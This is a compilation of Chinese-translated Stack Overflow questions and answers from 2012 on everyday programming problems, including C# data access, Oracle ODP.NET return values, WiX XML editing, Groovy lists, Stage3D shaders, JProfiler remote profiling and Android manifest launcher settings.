`Numeric`是十进制数据类型，而不是整数。但是您试图直接将其转换为整数。如果`Salary`数据库中的值是小数，请尝试将`Salary`对象上的值也更改为 a `decimal`。

请注意，您只需一次删除一个字段并重新运行测试即可轻松调试此问题并缩小问题范围。当您删除一个字段并且它起作用时，重新添加该字段并且它再次不起作用，您找到了罪魁祸首。

另请注意，您的异常处理形式非常糟糕：

```
catch (SqlException e)
{
    throw new ApplicationException("Data error.");
} 
```

您不仅完全忽略了实际异常，而且将其替换为另一个完全没有上下文的异常。您至少应该记录发生的异常。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:37:05.287

尝试这个：

```
EmployeeDetails emp=new EmployeeDetails(Convert.ToInt32(reader["EmpId"]),Convert.ToString(reader["EmpName"]),Convert.ToInt32(reader["Salary"]));

//this assumes that you don't have NULL values in any of those columns, because if you do, it will fail.  It would be more safe to check for DBNull.Value before trying to Cast these values. 
```

# c# - 将 Oracle Sql 查询中的 sql 变量值返回给 .NET 代码

> ID：12215454
> 
> 赞同：3
> 
> 时间：2012-08-31T12:31:33.777
> 
> 标签：c#, oracle, variables, select, ado.net

在过去的几个小时里，我试图通过使用 ADO.NET 的 .NET 应用程序在 Oracle 数据库中做最简单的事情（至少对于 SQL SERVER）。这似乎是不可能的。

对于 SQL SERVER，我会做这个简单的任务，假设我有一个 SqlCommand 对象

```
comm.CommandText = @"
   DECLARE @next_id INT
   SET @next_id = (SELECT ISNULL(MAX(id_col),0) FROM TABLE_1) + 1
   INSERT INTO TABLE_1 (id_col, col1, ...) VALUES (@next_id, val1, ...)
   SELECT @next_id";
int id = Convert.ToInt32(comm.ExecuteScalar()); 
```

这将在表 TABLE_1 中插入一条新记录，我将在 c# 代码的“id”变量中取回新的 id。

四个简单的步骤

*   声明一个变量
*   将其设置为下一个可用的 id
*   插入带有新变量的记录
*   返回变量的值

好的，我设法在 Oracle 查询中声明了变量。我也（认为）我设法给它一个值（使用 SELECT INTO）

如何在 c# 中取回这个变量的值？如何在 Oracle SQL 的输出流中选择变量的值？

*我知道有更好的方法来实现取回身份列，但这不是这里的问题。这可能是一个完全不同的例子。问题很简单。*：我在 oracle sql 脚本中声明了一个变量，该脚本将从 .net 应用程序中执行。**如何从 oracle 查询中将变量的值返回给 c#？**上述代码与 Oracle ADO.NET 查询的等价物是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T13:29:27.937

您需要使用[ODP.NET](http://www.oracle.com/technetwork/topics/dotnet/index-085163.html)（Oracle 的 Oracle 数据访问组件）：

下面是一个例子。请注意，在 ODP.NET 中，您可以建立参数方向（输入、输入输出、输出、返回值）以与您正在运行的过程或语句的参数相对应。在此示例中，我获取了一个返回值，它是 db 通过序列和触发器生成的 ID（就 .NET 应用程序而言，它是自动创建的）：

```
int event_id = 0;
using (OracleConnection oraConn = new OracleConnection(connStr))
{
    string cmdText = @"insert into EVENT
        (EVENT_NAME, EVENT_DESC)
        values
        (:EVENT_NAME, :EVENT_DESC)
        RETURNING EVENT_ID INTO :EVENT_ID
        ";

    using (OracleCommand cmd = new OracleCommand(cmdText, oraConn))
    {
        oraConn.Open();
        OracleTransaction trans = oraConn.BeginTransaction();
        try
        {
            OracleParameter prm = new OracleParameter();
            cmd.BindByName = true;
            prm = new OracleParameter("EVENT_NAME", OracleDbType.Varchar2); 
            prm.Value = "SOME NAME"; cmd.Parameters.Add(prm);

            prm = new OracleParameter("EVENT_DESC", OracleDbType.Varchar2); 
            prm.Value = "SOME DESC"; cmd.Parameters.Add(prm);

            prm = new OracleParameter( "EVENT_ID"
                                     , OracleDbType.Int32
                                     , ParameterDirection.ReturnValue); 
            cmd.Parameters.Add(prm);

            cmd.ExecuteNonQuery();
            trans.Commit();
            // return value
            event_id = ConvertFromDB<int>(cmd.Parameters["EVENT_ID"].Value);
        }
        catch
        {
            trans.Rollback();
            throw;
        }
        finally
        {
            trans.Dispose();
        }
        oraConn.Close();
    }
} 
```

ConvertFromDB 只是将返回值转换为其 .NET 等效项（在本例中为 int）的泛型。

希望有帮助。

编辑：

您可以在 ODP.NET 中轻松绑定值数组（并检索返回值数组）：

```
using (OracleConnection oraConn = new OracleConnection(connStr))
{
    string cmdText = @"insert into TEST_EVENT
        (EVENT_NAME, EVENT_DESC)
        values
        (:EVENT_NAME, :EVENT_DESC)
        RETURNING EVENT_ID INTO :EVENT_ID
        ";

    using (OracleCommand cmd = new OracleCommand(cmdText, oraConn))
    {
        oraConn.Open();
        OracleTransaction trans = oraConn.BeginTransaction();
        try
        {
            string[] event_names = new string[2];
            string[] event_descs = new string[2];
            int[] event_ids = new int[2];

            event_names[0] = "Event1";
            event_descs[0] = "Desc1";

            event_names[1] = "Event2";
            event_descs[1] = "Desc2";

            OracleParameter prm = new OracleParameter();
            cmd.Parameters.Clear();
            cmd.ArrayBindCount = 2;
            cmd.BindByName = true;

            prm = new OracleParameter("EVENT_NAME", OracleDbType.Varchar2); 
            prm.Value = event_names; cmd.Parameters.Add(prm);

            prm = new OracleParameter("EVENT_DESC", OracleDbType.Varchar2); 
            prm.Value = event_descs; cmd.Parameters.Add(prm);

            prm = new OracleParameter( "EVENT_ID"
                                     , OracleDbType.Int32
                                     , ParameterDirection.ReturnValue); 
            cmd.Parameters.Add(prm);

            cmd.ExecuteNonQuery();
            trans.Commit();
            // get return values

            event_ids = (int[])(cmd.Parameters["EVENT_ID"].Value);
        }
        catch
        {
            trans.Rollback();
            throw;
        }
        finally
        {
            trans.Dispose();
        }
        oraConn.Close();
    }
} 
```

# xpath - 使用 WiX XmlConfig 删除 XML 元素

> ID：12215458
> 
> 赞同：1
> 
> 时间：2012-08-31T12:31:49.800
> 
> 标签：xpath, wix, wix3.5, wix-extension

我有这个 XML 文件：

```
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <dependency>
    <dependentAssembly>
        <assemblyIdentity name="Assembly1" version="1.1.0.0" type="win32" publicKeyToken="7XXXXXXXXXXXD"/>
    </dependentAssembly>
  </dependency>
  <dependency>
    <dependentAssembly>
        <assemblyIdentity name="Assembly2" version="1.1.0.0" type="win32" publicKeyToken="7xxxxxxE89CD" />
    </dependentAssembly>
  </dependency>
</assembly> 
```

我想使用 Wix XmlConfig 删除`AssemblyIdentity`带有`name="Assembly2"`. 我已经尝试过这种 Wix 配置，但只有当我要删除的元素是第一个元素时它才有效：

```
<util:XmlConfig On="install"
                Action="delete"
                Id="DeleteElement"
                Node="element"
                File="[MANIFESTFOLDER]\test.exe.Manifest"
                VerifyPath="//assembly/dependency/dependentAssembly/assemblyIdentity[\[]@name='Assembly2'[\]]"
                ElementPath="//assembly/dependency/dependentAssembly"
                Sequence="1">
</util:XmlConfig> 
```

如何删除我想要的元素，即使它不是最重要的元素？
（不一定是最后一个，例如可以是倒数第二个。）

# groovy - 如何迭代列表并删除匹配项以创建新列表

> ID：12215460
> 
> 赞同：0
> 
> 时间：2012-08-31T12:32:07.103
> 
> 标签：groovy, groovy-2

我是 groovy 列表的新手，我的列表如下所示：

```
Class File{
 String name 
 int type
 int revision
}

def fileList = [File1, File2, File3,....] 
```

我希望`fileList`拥有最新的文件

1.  它不应该有相同类型的项目
2.  它应该具有最高版本的文件意味着，如果两个或多个文件具有相同的类型，则列表必须具有最高版本的单个文件。

我如何在 Groovy 中做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T19:42:25.470

您可以使用[`Collection#groupBy`](http://groovy.codehaus.org/groovy-jdk/java/util/Collection.html#groupBy%28groovy.lang.Closure%29)为每个唯一文件名创建一个条目的映射。然后，您可以使用[`Map#collect`](http://groovy.codehaus.org/groovy-jdk/java/util/Map.html#collect%28groovy.lang.Closure%29)迭代此地图的内容并创建所需的列表。地图的值将是 的实例列表`File`，因此[`Collection#max`](http://groovy.codehaus.org/groovy-jdk/java/util/Collection.html#max%28groovy.lang.Closure%29)您可以搜索具有最高修订号的实例。

```
class File {
    String name
    int type
    int revision

    String toString() { "File(name: $name; type: $type; revision: $revision)" }
}

final files = [
    new File(name: 'foo', type: 0, revision: 0),
    new File(name: 'bar', type: 0, revision: 0),
    new File(name: 'bar', type: 0, revision: 1),
    new File(name: 'baz', type: 0, revision: 0),
    new File(name: 'baz', type: 0, revision: 1),
    new File(name: 'baz', type: 1, revision: 1),
]

final result = files.groupBy { it.name }
             . collect { name, revisions -> revisions.max { it.revision } } 
```

当您说列表不应包含相同类型的项目时，我不确定您的意思。您会注意到，如果有两个`File`具有相同名称和修订号但类型不同的实例，则此解决方案会任意选择一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:48:17.433

我建议阅读 [http://groovy.codehaus.org/groovy-jdk/java/util/Collection.html](http://groovy.codehaus.org/groovy-jdk/java/util/Collection.html) 和 [http://groovy.codehaus.org/Collections](http://groovy.codehaus.org/Collections)

这样做的一个非常天真的方法是使用 collect 方法如下

```
fileList.collect { file ->
  //your condition
}.unique { file ->
  //code that determines uniqueness
} 
```

您可以在 collect 闭包中将其作为条件的一部分编写为重复项返回 false ，然后您就不必调用 unique()

[编辑] 考虑到您面临的问题，您实际上并不想使用上述方法。使用 each 方法遍历您的值。正如我所说，这是完成任务的一种天真的方式，您可能想研究一种很好的递归方法，它可以搭载排序算法。

[编辑] 合并同一问题的 2 个答案（效率设计注意事项）

这是一个使用 Justin Piper 代码的简单示例。通读我发布的那些 API 以及 List JDK。你肯定能做出更有效的方法。这段代码应该让您很好地了解 groovy 的工作原理以及闭包可以做什么。

```
class File {
    String name
    int type
    int revision

    String toString() { "File(name: $name; type: $type; revision: $revision)" }
}

def files = [
  new File(name: 'First Type2', type: 2, revision: 0),
  new File(name: 'First Type0', type: 0, revision: 1),
  new File(name: 'First Type1', type: 1, revision: 1),
  new File(name: 'Second Type0', type: 0, revision: 0),
  new File(name: 'Second Type1', type: 2, revision: 1),
  new File(name: 'Second Type2', type: 1, revision: 1),
]
//This will hold the final set of files according to the logic in the next each()
def selectedFiles = [:] 
files.each { file ->
     //Overwrite the value associated with the key, which is the type depending on the logic - we only keep 1 of each type
     if(selectedFiles[file.type]){
         if(selectedFiles[file.type].revision < file.revision){
            selectedFiles[file.type] = file
         }
     }
     else{
         //This type never existed, so just write the file as the value
         selectedFiles[file.type] = file
     }
}

selectedFiles.each { type, file ->
    println(file)
} 
```

# ios5 - 将应用程序捕获的图像与 icloud 同步

> ID：12215472
> 
> 赞同：2
> 
> 时间：2012-08-31T12:32:41.937
> 
> 标签：ios5, core-data, icloud

我只是在学习核心数据，并且已经完成了以下任务。我有一个将核心数据与 iCloud 同步的应用程序。现在我应该提供功能，根据该功能，用户应该能够将相机胶卷中的图像与某个实体链接起来。因此，这些图像也应该与 iCloud 同步。我知道我可以创建“图像”实体，将现有实体与它“连接”并同步。但我知道存储到核心数据的图像并不可取。因此，我认为另一种选择是将图像存储到某个目录并同步它。我想知道第二个选项是否可以实现并与现有代码集成。另外，如果可能，请提供一些示例。谢谢。

# wordpress - Joomla | 新开发者 | 数据库中的写入选项

> ID：12215481
> 
> 赞同：2
> 
> 时间：2012-08-31T12:33:15.897
> 
> 标签：wordpress, joomla, joomla2.5, joomla-extensions

我是一名新的 Joomla 开发人员，我尝试为 Joomla 创建一个模块，我喜欢在数据库中为该模块编写一些选项。

在 WordPress 中，我有一个函数“add_option()”，它允许我将一些选项写入全局 WordPress 选项表。

在 Joomla 中是否有类似的东西？有没有办法在不创建新表的情况下在数据库中编写一些选项？

如果没有可用的选项，是否有任何文章/教程可以帮助我创建 Joomla 表并将数据添加到该表中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:47:43.667

您必须使用此链接，它确实可以帮助您在 joomla 中创建新模块。

```
http://docs.joomla.org/Creating_a_simple_module 
```

实际上你想要什么，你能在这里解释一下你在 Joomla 中要做什么吗？因为通过使用 joomla，我们可以创建组件、模块、插件。每个元素用于不同的目的。

需要更好的说明你.. :)

# actionscript-3 - AS3 Stage3D 片段着色器？

> ID：12215484
> 
> 赞同：1
> 
> 时间：2012-08-31T12:33:30.787
> 
> 标签：actionscript-3, assembly, fragment-shader, stage3d

有人能告诉我这两个片段着色器有什么区别吗：

```
// Adobe's GPUSprite Fragment Shader 
"tex ft0, v0, fs0 <2d,clamp,linear,mipnearest> \n" + 
"mul ft0, ft0, v0.zzzz\n" +  // multiply with alpha?? 
"mov oc, ft0 \n"

// Node2D Fragment Shader 
"tex ft0, v0, fs0 <2d,clamp,linear,mipnearest> \n" + 
"mul ft0, ft0, fc0\n" + // this line is different
"mov oc, ft0 \n" 
```

只有第二行不同，我们将它与 alpha 相乘。因此，第二个着色器（Node2D）允许您通过*setProgramConstantsFromVector(Context3DProgramType.FRAGMENT, 0, [1,1,1,1]);传入主 alpha 值。*调用，这将导致使用该 alpha 绘制所有三角形。

**1）**有人可以告诉我第二行发生了什么吗？

**2)**以上在实践中所做的是，它***覆盖***了每个三角形的各个 alpha 设置。我想要的是将它自己的 alpha 与着色器***相乘***，这样最终的 alpha 值将是 **= Triangle_alpha * Shader_alpha**。

（因为现在我无法使用第二个着色器为特定三角形设置单独的 alpha 值。我想要的是能够分别为每个三角形设置一个 alpha 值，并为整个 drawTriangles 调用设置另一个）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T18:30:31.623

我想修改我的答案，因为原件不正确。

```
"mul ft0, ft0, v0.zzzz\n" 
```

将片段 RGBA 乘以存储在可变寄存器 0 中的值的第三个分量。这可能是顶点坐标，从顶点着色器传递到片段着色器。这条线应该使颜色变亮，离相机越远。

```
"mul ft0, ft0, fc0\n" 
```

将片段 RGBA 乘以上传到片段常量 0 中的 RGBA 值。常量中的颜色越亮/越透明，最终值就越亮/越透明。

如果您只想更改 alpha，您可以尝试：

```
"mul ft0.a, ft0.a, fc0.a\n" 
```

如果您只想组合 alpha，您可以尝试相加而不是相乘。

```
"add ft0.a, ft0.a, fc0.a\n" 
```

* * *

您可以通过在每个顶点中放置一个 alpha 分量来为每个三角形指定单独的 alpha 值。在将它们与片段 Alpha 组合之前，您可以将这些值与可以存储在常量中的“全局”Alpha 组合。唯一的问题是，如果顶点具有不同的 alpha 值，您将不得不复制它们。

因此，示例三角形的顶点将来自：

```
var vertices:Vector.<Number> = Vector.<Number>([
    //x, y, z, w,
    0, 0, 0, 0,
    1, 0, 0, 0,
    0, 1, 0, 0,
]);

vertexBuffer:VertexBuffer3D = context3D.createVertexBuffer(3, 4);
vertexBuffer.uploadFromVector(vertices, 0, 3); 
```

到：

```
var vertices:Vector.<Number> = Vector.<Number>([
    //x, y, z, w, a
    0, 0, 0, 0, 0.5,
    1, 0, 0, 0, 0.5,
    0, 1, 0, 0, 0.5,
]);

vertexBuffer:VertexBuffer3D = context3D.createVertexBuffer(3, 5);
vertexBuffer.uploadFromVector(vertices, 0, 3); 
```

然后，您将通过可变寄存器将 alpha 值从顶点着色器传递到片段着色器，您可以在其中使用它。

# jprofiler - 远程分析 Jprofiler

> ID：12215487
> 
> 赞同：7
> 
> 时间：2012-08-31T12:33:46.837
> 
> 标签：jprofiler

嗨，我对 Jprofiler 和 Linux 很陌生。我正在尝试从安装在 Windows 机器上的 Jprofiler 远程分析监视安装在 linux 机器上的 Apache Tomcat 服务器。请详细帮助我完成程序。我尝试了我可以从谷歌获得的所有帮助，但仍然卡住..任何帮助将不胜感激。提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T14:36:49.520

在任何情况下，您都应该在远程机器上为 Linux 提取 JProfiler tar.gz 文件。远程端不需要进一步配置。在本地，您需要完整安装 JProfiler。

有两种方法可以让远程分析工作：

### A. 附加到正在运行的 Tomcat 进程

在远程机器上执行 JProfiler 发行版中的命令行实用程序`bin/jpenable`并选择 Tomcat 进程。然后，JVM 将准备好进行分析。如果未列出已分析的 JVM，请以运行 Tomcat JVM 的同一用户身份执行 jpenable。如果确实有帮助，请使用备选方案 B。

在本地机器上，创建类型为“附加到已分析的 JVM（本地或远程）”的会话，指定远程机器的主机名和使用 jpenable 设置的分析端口。

当您启动会话时，JProfiler GUI 将连接到远程机器，您将看到分析数据。

### B. 使用集成向导

在远程机器上执行 JProfiler 发行版中的命令行 uutility`bin/jpintegrate`并选择您的应用程序服务器并执行后续步骤。

然后，按照备选方案 A 进行操作。此选项实际上比备选方案 A 更可取，除非您必须对已经运行的 JVM 进行概要分析，否则您应该采用这条路线。

# android - 动态复选框添加/删除到 LinearLayout VS ListView

> ID：12215491
> 
> 赞同：0
> 
> 时间：2012-08-31T12:34:06.280
> 
> 标签：android, listview, checkbox, adapter

我有一个从另一个活动中获得的数组。我想在当前 Activity 中将其显示为 CheckBox 项目，然后能够检查其中的一些项目并通过单击按钮进行删除。我用下一个方法实现它：

```
 public void addFiles()
        {

             LinearLayout layout = (LinearLayout) findViewById(R.id.filesList);

            if(!FileManagerActivity.finalAttachFiles.isEmpty())
            {   

                for (int i=0; i<FileManagerActivity.finalAttachFiles.size();i++)
                {   

                    View line = new View(this);
                    line.setLayoutParams(new LayoutParams(1, LayoutParams.MATCH_PARENT));
                    line.setBackgroundColor(0xAA345556);
                    informationView= new CheckBox(this);
                    informationView.setTextColor(Color.BLACK);
                    informationView.setTextSize(16);
                    informationView.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
                    informationView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.file_icon, 0, 0, 0);
                    informationView.setText(FileManagerActivity.finalAttachFiles.get(i).getName().toString());
                    informationView.setId(i);
                    layout.addView(informationView, 0);
                    layout.addView(line, 1);
                    layout.postInvalidate();

                }
            }

        } 
```

，并在 onCreate() 方法中调用它。可以成功添加。然后我得到这样检查的项目：

```
 btnFilesRemove.setOnClickListener(new View.OnClickListener() {

        public void onClick(View view) {
            LinearLayout layout = (LinearLayout) findViewById(R.id.filesList);
            View v = null;
            for(int i=0; i<FileManagerActivity.finalAttachFiles.size(); i++) {
                v = layout.getChildAt(i);

                CheckBox checkBox = (CheckBox) findViewById(i);
                boolean checked=checkBox.isChecked();
                if (checked)
                {  
                    Log.i("was checked",checkBox.getText().toString());
                    ViewGroup parent = (ViewGroup) v.getParent();
                    parent.removeView(v);
                    FileManagerActivity.finalAttachFiles.remove(i);
                    Log.i("this is view,baby",v.toString());

                }

            }

        }
    }); 
```

但无法删除项目。而且我在想 - 什么更好 - 以这种方式实现它，或者使用 ListView 可能会更有效。我的意思是创建 ArrayAdapter 等。

# android - Android 应用程序未在任何设备上运行

> ID：12215492
> 
> 赞同：0
> 
> 时间：2012-08-31T12:34:11.950
> 
> 标签：android

我无法在模拟器和设备上运行任何应用程序。仅仅运行简单的“Hello World”应用程序是行不通的。该应用程序安装在模拟器上，但从不执行。我可以在菜单 -> 管理应用程序中找到它，但我唯一能做的就是卸载它。似乎有一个设置不会强制它自动运行。

此外，奇怪的是我的电脑永远不会让我安装新的更新。它只会说“正在下载......”但什么也没发生。我通过进入带网络的安全模式解决了这个问题，但我仍然无法运行任何应用程序。有任何想法吗？？？

这是我去 Run as -> Android App 时的内容

```
[2012-08-31 08:17:52 - at] New emulator found: emulator-5554 
[2012-08-31 08:17:52 - at]   Waiting for HOME ('android.process.acore') to be launched... [2012-08-31 08:19:13 - at] HOME is up on device 'emulator-5554' 
[2012-08-31 08:19:13 - at] Uploading at.apk onto device 'emulator-5554' 
[2012-08-31 08:19:13 - at] Installing at.apk... 
[2012-08-31 08:20:03 - at] Success! 
[2012-08-31 08:20:03 - at] \at\bin\at.apk installed on device 
[2012-08-31 08:20:03 - at] Done! 
```

这是我的清单文件：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="c.panic"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="15" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name=".MainActivity"
        android:label="@string/title_activity_main" >
        <meta-data
            android:name="android.support.PARENT_ACTIVITY"
            android:value="parent" />
    </activity>
</application> 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:38:17.833

您必须`<intent-filter>`在文件中更改主要活动的标签过滤器`AndroidManifest.xml`。

```
<application android:name="......"
    android:icon="@drawable/app_icon"
    android:label="@string/app_name" >
        <activity android:name=".yourActivity">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity> 
```

意味着，你必须改变你的活动`<action>`和`<category>`

**编辑**

只需在清单文件中进行如下更改即可。它将启动您的应用程序。

```
<activity
    android:name=".MainActivity"
    android:label="@string/title_activity_main" >
    <meta-data
        android:name="android.support.PARENT_ACTIVITY"
        android:value="parent" />
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
</activity> 
```

# rest - 如何创建 Rest Web 服务客户端和服务器

> ID：12215496
> 
> 赞同：1
> 
> 时间：2012-08-31T12:34:33.713
> 
> 标签：rest, service, web

嗨，我需要使用 REST Web 服务，但不知道如何开始。虽然我检查了不同的文章，但没有合适的例子来说明 REST SERVER 和 REST CLIENT 的流程。是否有任何好的示例链接可以说明如何使用 php 创建 REST 服务器以及如何使用哪种技术调用此 Web 服务。我需要网络服务来向客户展示，然后也使用网络服务更新客户。我需要为我的应用程序创建自己的 Web 服务，因此我需要创建 Rest 服务器和 Rest 客户端。

谢谢克林奇

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:38:11.997

**REST**不是一种技术，它是一种**软件架构风格**

如果你想要一些具体的例子和一个简单的框架来开始，试试[**cherrypy**](http://docs.cherrypy.org/dev/progguide/REST.html)，它是一个用python编写的最小的网络框架。

这应该让您开始使用可以帮助您遵守**REST**设计原则的 Web 服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-12T11:22:40.640

您可以尝试 PHP REST 数据服务[https://github.com/chaturadilan/PHP-Data-Services](https://github.com/chaturadilan/PHP-Data-Services)

# c# - FileSystemInfo 到字符串数组

> ID：12215501
> 
> 赞同：0
> 
> 时间：2012-08-31T12:34:52.730
> 
> 标签：c#, .net, windows

我想知道将 FileSystemInfo 转换为字符串数组的最有效方法是什么 - 我的代码如下：

```
 string[] filePaths;
    DirectoryInfo di = new DirectoryInfo(batchDirectory);
    FileSystemInfo[] files = di.GetFileSystemInfos();
    filePaths = files.OrderBy(f => f.CreationTime); 
```

我试过了：

```
filePaths = files.OrderBy(f => f.CreationTime).ToArray; 
```

但没有运气

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:36:22.677

尝试这个：

```
filePaths = files.OrderBy(f => f.CreationTime).Select(x => x.FullName).ToArray(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:37:27.003

给数组加括号()；

```
 files.OrderBy(f => f.CreationTime).ToArray(); 
```

# c# - 如何在代码隐藏中获取 jQuery 多选 UI 的选定值？

> ID：12215504
> 
> 赞同：2
> 
> 时间：2012-08-31T12:35:01.030
> 
> 标签：c#, jquery, .net, jquery-ui

我有 jQuery UI 多选。我需要在代码隐藏中单击按钮时选择的值。

.aspx 页面：

```
 <select id="countries" runat="server" class="multiselect" name="countries[]">
    </select>

    <asp:Button id="Submit" runat="server" OnClick="btn_OnClick"></asp:Button> 
```

.cs 页面：

```
protected void Page_Load(object sender, EventArgs e) {
   countries.Attributes.Add("multiple", "multiple");
   for(int i=0; i<10; i++) {
      countries.Items.Add(i.ToString());
    }
 }

protected void btn_OnClick(object sender, EventArgs e) {   }​ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:00:21.593

您需要将您的选择元素更改为此（选项只是示例）：

```
<select runat="server" id="countries" multiple="true" class="multiselect">
    <option label="1" value="1" />
    <option label="2" value="2" />
    <option label="3" value="3" />
    <option label="4" value="4" />
    <option label="5" value="5" />
</select> 
```

您省略了 runat="server"，并且 multiple 属性必须为 true 而不是“multiple”。ASP.NET 将为您处理 name 属性。

在后面的代码中，您将需要遍历所有 select 的项目并检查它们的 selected 属性，如下所示：

```
protected void btn_OnClick(object sender, EventArgs e)
{
    for (int i = 0; i < countries.Items.Count; i++)
    {
        if (countries.Items[i].Selected)
        {
            // do something
            // countries.Items[i].Value;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T12:04:01.967

.aspx 页面：

```
<link rel="stylesheet" href="css/common.css" type="text/css" />
<script type="text/javascript" src="js/page.js"></script>
    <link type="text/css" rel="stylesheet" href="css/themes/smoothness/jquery-ui-1.7.1.custom.css" />
    <link type="text/css" href="css/ui.multiselect.css" rel="stylesheet" />
    <script type="text/javascript" src="js/jquery-1.4.2.min.js"></script>
    <link href="js/style.css" rel="stylesheet" type="text/css" />
    <script type="text/javascript" src="js/jquery-ui-1.8.custom.min.js"></script>
    <script type="text/javascript" src="js/plugins/localisation/jquery.localisation-min.js"></script>
    <script type="text/javascript" src="js/plugins/tmpl/jquery.tmpl.1.1.1.js"></script>
    <script type="text/javascript" src="js/plugins/blockUI/jquery.blockUI.js"></script>
    <script type="text/javascript" src="js/ui.multiselect.js"></script>

    <script type="text/javascript">
        $(function () {
            // remote
            $("#languages").multiselect({

            });

        });
    </script>

     <form target="submitFrame" runat="server">
<div>
       <dl>
           <dd>
          <select id="languages" class="multiselect" runat="server" name="languages[]">
           </select>
          </dd>
       </dl>
</div>
<div class="optionWrapper">
  <div class="optionInput">
    <input id="ec_checkValues" type="button" class="button" value="Assign Employees" />
     Selected Employees:
       <input id="hdn" type="text" />
   </div> 
```

.cs 页面：

```
 protected void Page_Load(object sender, EventArgs e)
    {
        languages.Attributes.Add("multiple", "multiple");
        DataTable dt = obj.GetDataStoreInTable("Select top 10 intslno, nvrempname from tblHRIMS_employeedetail");
        languages.DataSource = dt;
        languages.DataTextField = "nvrempname";
        languages.DataValueField = "intslno";
        languages.DataBind();
    } 
```

# actionscript-3 - AS3 网络流反向

> ID：12215507
> 
> 赞同：2
> 
> 时间：2012-08-31T12:35:06.703
> 
> 标签：actionscript-3, video-streaming, external, reverse, netstream

我正在使用 netstream 播放文件夹中的一系列视频。

这个想法是让他们作为网站的菜单工作。前任：

点击按钮 > [播放视频] > 显示内容

然后

单击关闭> [反向播放视频> 显示菜单

这可能吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T14:19:07.980

Reverse playback is not possible with [NetStream](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/NetStream.html) object. You're limited by the capabilities of the object as written by Adobe. You could step through individual frames if you had a streaming media server, but the playback would likely be subpar for realtime.

Your best bet is to create two versions of your videos: one forward, one rendered in reverse. You can then simply [ns.play()](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/NetStream.html#play%28%29) each stream forward.

# c# - 有没有办法从 .cs 文件中获取函数列表？

> ID：12215512
> 
> 赞同：2
> 
> 时间：2012-08-31T12:35:26.287
> 
> 标签：c#, powershell, powershell-2.0

我的经理要求我获取项目中每个 .cs 文件中可用的函数列表。

但是 .cs 文件的数量很大。

手动看很难。

有没有办法通过编写脚本或代码在 .cs 文件中找到函数名？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T12:40:32.980

使用反射。如果所有文件都在项目中，那么您可以使用：

```
Type[] types = Assembly.GetExecutingAssembly().GetTypes();
foreach (Type toCheck in toProcess)
{
    MemberInfo[] memberInfos = toCheck.GetMembers(BindingFlags.NonPublic | BindingFlags.Public | OtherBindingFlagsYouMayNeed);
    //Loop over the membersInfos and do what you need to such as retrieving their names
    // and adding them to a file
} 
```

如果项目被编译成 dll，那么您可以使用：

```
Assembly assembly = Assembly.LoadFrom(filePath); //filePath is for the dll
Type[] toProcess = assembly.GetTypes();
//rest of the code is same as above 
```

编辑：如果您想像@BAF 提到的那样找出每个物理文件的功能，您将获得程序集的基本目录（通过 .CodeBase），然后执行目录树遍历查找所有 .cs 文件，然后您将实现一个可以区分每个文件中的方法声明的解析器（可能还需要一个词法分析器来帮助解决这个问题）。两者都没有什么特别困难的，但它们确实需要一些工作，而且太复杂，无法在此处作为答案包含在内。至少这是最简单的答案，它将涵盖我能想到的所有类型的方法声明，除非有人能提出更简单的方法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-31T13:46:09.000

你看过罗斯林吗？

检查 Doug Finke 的 Get-RoslynInfo 脚本 cmdlet：http: [//www.dougfinke.com/blog/index.php/2011/10/30/analyze-your-c-source-files-using-powershell-and-the -get-roslyninfo-cmdlet/](http://www.dougfinke.com/blog/index.php/2011/10/30/analyze-your-c-source-files-using-powershell-and-the-get-roslyninfo-cmdlet/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-02T11:02:16.663

如果其他人已经完成了艰苦的工作，请不要自己创造东西。

由于您拥有源代码，因此请使用[Sandcastle](http://www.simple-talk.com/dotnet/.net-tools/taming-sandcastle-a-.net-programmers-guide-to-documenting-your-code/)之类的工具，该工具旨在生成源代码文档。您还没有指定输出需要采用什么格式，因此这可能是可接受的，也可能是不可接受的。

这是您的项目/团队应该随时可以做的事情；有人可以在您完成 5 分钟后添加新方法或类，从而使您的工作过时。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T13:38:29.090

如果您无法将 csharp 文件编译为程序集，则必须编写一个解析器。编写与方法声明匹配的正则表达式相当容易（查看 C# 语言规范）。但是你会得到一些误报（在块注释中声明的方法），你还必须考虑 getter 和 setter。

